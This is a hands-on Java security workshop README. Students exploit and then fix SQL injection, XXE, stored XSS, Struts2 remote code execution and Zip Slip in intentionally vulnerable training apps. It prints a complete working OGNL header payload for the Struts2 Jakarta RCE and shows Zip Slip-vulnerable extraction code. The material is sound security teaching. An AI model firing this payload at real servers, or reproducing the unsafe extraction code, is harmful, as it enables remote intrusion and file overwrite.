# GIDS 2020 Security Workshop

This workshop is specifically created for the GIDS 2020 
[GIDS.JAVA Live Workshop (11 September 2020)](https://hopin.to/events/gids-java-live-workshop-11-september)

GIDS.Java Live Workshop (11 September) features a 3.5 hours live workshop led by 
- [Steve Poole](https://www.wurreka.com/ict/virtual-conference/java/speaker/steve-poole) (DevOps Practitioner and Developer Advocate, IBM) 
- [Brian Vermeer](https://www.wurreka.com/ict/virtual-conference/java/speaker/brian-vermeer) (Developer Advocate at Snyk)

## Java Application Security the Hard Way - Workshop for the Serious Developer

Cybercrime is rising at an alarming rate. As a Java developer you know you need to be better informed about security matters but it’s hard to know where to start. This workshop will help you understand how to improve the security of your application through a series of demonstration hacks and related hands on exercises. Serious though the topic is, this practical workshop will be fun and will leaving you more informed and better prepared. Start building your security memory muscle here

# Exercises PART 1

Your code
In this step by step workshop, you'll learn how to exploit this Java application and the code changes you need to make to fix it.

## Required software
- Java 8
- Maven
- Browser (preferably Chrome)
- IDE / Code editor (with lombok plugin)

## Installation 

To start with, you’ll need to clone the code-workshop repository, and build your application. The application can be found on GitHub here: https://github.com/snyk/java-goof. [bmvermeer/java-security-code-workshop](https://github.com/bmvermeer/java-security-code-workshop)

Clone the repository onto your local file system
```
$ git clone https://github.com/bmvermeer/java-security-code-workshop.git
```

Open a terminal and run the following command from the root directory:
```
$ mvn clean package
```
Run the application
```
mvn spring-boot:run
```

Alternatively, you can run this Spring boot app from your IDE if you wish to do that.

## Application
When your application is running you can access it at [http://localhost:8080/](http://localhost:8080/)

![homepage](https://github.com/bmvermeer/java-security-code-workshop/blob/master/images/index.png)

This application allows you to search through a user database and allows you to do some basic admin tasks on that.
Play around for a bit to see how it works.


# Assignments

## Assignment 1 Search

On the Search page, you can search the users by **username**.
By using a `%` you can provide wildcards. For instance `Super%` will give you the result for **Superman**
Using the search term `%man`

![Search](https://github.com/bmvermeer/java-security-code-workshop/blob/master/images/search.png)

### 1a Try to create a search phrase that searches for the **firstname** 'Bruce'

    
Click to see [Hint 1](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint1.md)

Click to see [Hint 2](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint2.md)

    
### 1b Try to override every **lastname** with 'EVIL'
    
Click to see [Hint 3](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint3.md)

Click to see [Hint 4](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint4.md)
    
### 1c Fix the vulnerability

Click to see [Hint 5](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint5.md)

Click to see [Hint 6](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint6.md)

Click to see [Hint 7](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/search/hint7.md)


## Assignment 2 Import

On the import page, you can import new users by using an XML.
We already created a sample XML file `users.xml` that you can use to import new users

![Import](https://github.com/bmvermeer/java-security-code-workshop/blob/master/images/import.png)

### 2a import new users using the `user.xml` file.
### 2b edit the file so we can read the `etc/passwd` file on your machine (or any other file for that matter)

Click to see [Hint 1](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint1.md)

Click to see [Hint 2](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint2.md)

Click to see [Hint 3](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint3.md)

Click to see [Hint 4](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint4.md)

Click to see [Hint 5](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint5.md)

Click to see [Hint 6](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint6.md)

### 2c Fix the vulnerability

Click to see [Hint 7](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint7.md)

Click to see [Hint 8](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/import/hint8.md)

## Assignment 3 Add User

On the *Add User* page you can manually add new Users
This is quite straight forward.

![AddUser](https://github.com/bmvermeer/java-security-code-workshop/blob/master/images/adduser.png)

### 3a Try to insert a new user using the form.
### 3b Try to do a code insertion when creating a new user.

Click to see [Hint 1](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint1.md)

Click to see [Hint 2](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint2.md)

### 3c Try to display the token of a user that is on the page

Click to see [Hint 3](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint3.md)

Click to see [Hint 4](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint4.md)

We just proved that we can execute code in the user’s browser.     
We also showed that we can simple access and display the cookie. Imagine that we send this token in the cookie to another website and take over your session?

### 3d Fix this by sanitizing the input before it enters the database

Click to see [Hint 5](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint5.md)

Click to see [Hint 6](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint6.md)

Click to see [Hint 7](https://github.com/bmvermeer/java-security-code-workshop/blob/master/hints/adduser/hint7.md)

# Exercises PART 2

## Java Goof Installation

To start with, you’ll need to clone the java-goof repository, and build your application. The application can be found on GitHub here: [https://github.com/snyk/java-goof](https://github.com/snyk/java-goof).

Clone the repository onto your local file system

```
$ git clone https://github.com/snyk/java-goof.git
```

Open a terminal and run the following command from the root directory:

```
$ mvn install
```

Navigate into the ```todolist-web-struts``` directory and run the following to start the server:

```
$ mvn tomcat7:run
```


From a browser navigate to the following URL: [http://localhost:8080/](http://localhost:8080/)

You will see this application. It looks better than the Node application. Because Java is better than Node. Fact.

![Java Goof homepage](images/image9.png)

Click “Sign In” and use the following credentials:

```
Username: foo@bar.org
Password: foobar
```

When signed in, you’ll see a number of todo entries. If you click about at the top of the screen, you’ll see that the application uses, Spring, Hibernate and Apache Struts. This is very kind of the application to give us this data! Websites aren’t usually this kind :)

## Scan your application

Back on the blue (defensive) team, now. We need to scan our application to understand the direct and indirect dependencies that exist in the application, as well as the vulnerabilities in each library.
Fork Java Goof to your own github account. The application can be found on GitHub here: [https://github.com/snyk/java-goof](https://github.com/snyk/java-goof) 

If you've already got a Snyk account from earlier in the workshop, you just need to add the Java Goof repository into the Snyk  dashboard. If you haven't done so, create your account as follows:

Navigate to [https://snyk.io](https://snyk.io) if you haven't done so already, click "Log in" or "Sign up" on the top right of the site.

![Login button](https://github.com/snyk/exploit-workshop/blob/master/images/image13.png)

Click the "Log in with your GitHub" button:

![Google Log in button](https://github.com/snyk/exploit-workshop/blob/master/images/image14.png)

Import the goof project that you just cloned previously. Click the Integrations link shown below:

![GitHub projects](https://github.com/snyk/exploit-workshop/blob/master/images/image25.png)

From here, select the GitHub integration and select ```java-goof``` from your GitHub repo list and click the "Add selected repositories" button on the top right of the window.

![GitHub projects](https://github.com/snyk/exploit-workshop/blob/master/images/image24.png)

When the project has been scanned you'll see it in your dashboard:

![Project Dashboard Goof](https://github.com/snyk/exploit-workshop/blob/master/images/image26.png)

Click the ```todolist-web-struts/pom.xml``` link to see the full list of security vulnerabilities for that portion of the project:

![Project vuln page](https://github.com/snyk/exploit-workshop/blob/master/images/image27.png)

## Assignment 1: Remote Code Execution

The vulnerability exists in the ```org.apache.struts:struts2-core``` package.

Affected versions of the package are vulnerable to Arbitrary Command Execution while uploading files with the Jakarta Multipart parser. This particular vulnerability can be exploited by an attacker by sending a crafted request to upload a file to the vulnerable server that uses a Jakarta-based plugin to process the upload request.

The attacker can then send malicious code in the ```Content-Type```, ```Content-Disposition``` or ```Content-Length``` HTTP headers, which will then be executed by the vulnerable server. A proof of concept that demonstrates the attack scenario is publicly available and the vulnerability is being actively exploited in the wild.

Although maintainers of the open source project immediately patched the vulnerability, Struts servers that have yet to install the update remain under attack by hackers who exploit it to inject commands of their choice.

This attack can be achieved without authentication. To make matters worse, web applications don't necessarily need to successfully upload a malicious file to exploit this vulnerability, as just the presence of the vulnerable Struts library within an application is enough to exploit the vulnerability.

Here is an example header which can exploit the vulnerability. Notice the content type starts with ```%{```.

```
"Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='COMMAND').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

You’ll notice a ```ProcessBuilder``` is created and a bash command will be executed as a result.

Hack the application by making an HTTP GET request to the application, sending this header in the request.

Click to see [Hint 1](https://github.com/snyk/exploit-workshop/blob/master/struts/hint1.md).

Click to see [Hint 2](https://github.com/snyk/exploit-workshop/blob/master/struts/hint2.md).

You should by now have executed a remote command, like this env command to retrieve the environment variables of your machine:

![Struts vuln exploits](https://github.com/snyk/exploit-workshop/blob/master/images/image6.png)

At this state you now have execution rights on the machine through curling an URL. Continue to run other commands to see what you can learn about the machine as well as run on the machine.

# Assignment 2: Zip Slip

Create a new Maven project in your IDE of choice. I won’t judge you. Add a new dependency in your ```pom.xml``` file.

```xml
    <dependency>
      <groupId>org.zeroturnaround</groupId>
      <artifactId>zt-zip</artifactId>
      <version>1.12</version>
      <type>jar</type>
    </dependency>
```

In this repository, you'll find a [zip-slip.zip](https://github.com/snyk/exploit-workshop/blob/master/zipslip/zip-slip.zip) archive. Download it and run the following command on the archive to see the output. I expect you’ll know how this hack works once you see the output.

```
$ jar -tvf zip-slip.zip
```

## The Zip Slip Vulnerability

Zip Slip is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. The vulnerability can also cause damage by overwriting configuration files or other sensitive resources, and can be exploited on both client (user) machines and servers.

The two parts required to exploit this vulnerability is a malicious archive and extraction code that does not perform validation checking. Let’s look through each of these in turn. First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the ```zip-slip.zip``` example, we can see two files, a good.txt file which would be extracted into the target directory and an evil.txt file which is trying to traverse up the directory tree to the tmp directory. You’ll notice many levels of ```../``` exist so that the file stands a better chance of reaching the root directory, before trying to traverse to the ```/tmp``` directory from the root directory.

Use the ```zt-zip```’s unpack utility found in ```ZipUtil``` to extract the file and notice where the ```good.txt``` and ```evil.txt``` appear on your filesystem.

Click to see [Hint 1](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint1.md).

Click to see [Hint 2](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint2.md).

Once you have unzipped the evil.txt file into your tmp directory, take a look at the vulnerability information ([https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681](https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681)).

### Fix the vulnerability!

Click to see [Hint 3](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint3.md).

Click to see [Hint 4](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint4.md).

Now that you’re remediated the vulnerability in your ```zt-zip``` dependency, let’s look at the code that can be used to do this in Java. Note we used the Apache Commons IO library in this example to perform our file copy on line 8.

```java
1.    	final String destinationDir = /* <your destination dir> */;
2.    	ZipFile zip = new ZipFile(/* <your zip file> */);
3.    	Enumeration<ZipEntry> entries =  (Enumeration<ZipEntry>) zip.entries();
4.    	while (entries.hasMoreElements()) {
5.    	  ZipEntry e = entries.nextElement();
6.    	  File f = new File(destinationDir, e.getName());
7.    	  InputStream input = zip.getInputStream(e);
8.    	  FileUtils.copyToFile(input, f);
9.  	}
```

Let’s switch out our previous ```ZipUtil.unpack``` invocation with this code. Delete the ```good.txt``` and ```evil.txt``` files from your file system and run the application again. You’ll notice the ```evil.txt``` file once again reaches the ```/tmp``` directory.

Identify which lines of code above are the culprits and fix them!

Click to see [Hint 5](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint5.md).

Click to see [Hint 6](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint6.md).

Click to see [Hint 7](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint7.md).

Click to see [Hint 8](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint8.md).

Click to see [Hint 9](https://github.com/snyk/exploit-workshop/blob/master/zipslip/hint9.md).

Once you’ve defensively coded your solution, check out our final code sample in [Hint 9](zipslip/hint9.md) to see how it compares to your version. Did you include the trailing file separator on line 9? This ensures that the directory doesn’t just start with the directory name we’ve chosen, but is the directory we chose to extract files to.
